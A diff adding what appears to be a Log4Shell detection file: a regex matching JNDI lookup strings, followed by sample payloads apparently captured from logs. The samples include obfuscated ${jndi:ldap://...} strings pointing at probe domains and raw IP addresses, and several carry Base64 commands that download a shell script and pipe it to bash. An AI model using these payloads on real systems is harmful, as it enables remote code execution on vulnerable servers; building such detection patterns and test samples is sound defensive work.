@@ -1,0 +1,37 @@
+(?<log4j>\$?\{?\${(jndi|env|:|lower|upper):(\w+|\W+)(\w+|\W+)(\w+|\W)(\S+}.|.\w+[^\/]+\S+).+})
+
+GET /${jndi:ldaps://lx-ffff23f2fe231800f13eb56100000000a26cd7.probe001.log4j.leakix.net:4444/b}?${jndi:ldaps://lx-ffff23f2fe231801f13eb5610000000084b32b.probe001.log4j.leakix.net:4444/b}=${jndi:ldaps://lx-ffff23f2fe231802f13eb56100000000fd1374.probe001.log4j.leakix.net:4444/b}" HTTP/1.1
+
+GET /${jndi:ldaps://ea372994.probe001.log4j.leakix.net:9200/b}?${jndi:ldaps://ea372994.probe001.log4j.leakix.net:9200/b}=${jndi:ldaps://ea372994.probe001.log4j.leakix.net:9200/b} HTTP/1.1 kjoijhijojoj
+
+${jndi:ldap://${env:JAVA_VERSION}.c6v09ky2vtc000092300gdpor3hyyyyyb.interactsh.com}
+
+${jndi:ldap://${env:JAVA_VERSION}.c6v09ky2vtc000092300gdpor3hyyyyyb.interactsh.com}\r\n
+
+${jndi:ldap://${hostName}.c6rm7maum5n0754i44qgcg5s3wayyytkw.interactsh.com/a}",
+
+${jndi:ldap://213.152.161.239:62582/a12222}","ClientSSLCi
+
+${jndi:ldap://167.172.44.255:389/LegitimateJavaClass}, Client: Java, Ap
+
+${jndi:ldap://155.138.206.215:20008/config}, Client: Chrome,
+
+${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}
+
+${${env:ENV_NAME:-j}n${env:ENV_NAME:-d}i${env:ENV_NAME:-:}${env:ENV_NAME:-l}d${env:ENV_NAME:-a}p${env:ENV_NAME:-:}//45.146.164.160:8081/w}
+
+${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j[.]bin${upper:a}ryedge[.]io:80/callback}
+
+${jndi:${lower:l}${lower:d}a${lower:p}://world80.log4j[.]bin${upper:a}ryedge[.]io:80/callback} 
+
+${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zNS4yMjguMjUuNzQ6ODB8fHdnZXQgLXEgLU8tIDQ1LjE1NS4yMDUuMjMzOjU4NzQvMzUuMjI4LjI1Ljc0OjgwKXxiYXNo}:"
+
+${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zNS4yMjguMTQuMTM2OjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzM1LjIyOC4xNC4xMzY6ODApfGJhc2g=}
+
+${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zNS4yMjguOS4xNzM6NDQzfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzM1LjIyOC45LjE3Mzo0NDMpfGJhc2g=}
+
+${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://3.${hostName}.c6qia64pu892o2ofnpigcg41azaycz384.interactsh.com}
+
+${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://3.${hostName}.c6qia64pu892o2ofnpigcg41c3yynf5oh.interactsh.com}
+
+${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://3.${hostName}.c6qia64pu892o2ofnpigcg41c8yybsboa.interactsh.com}
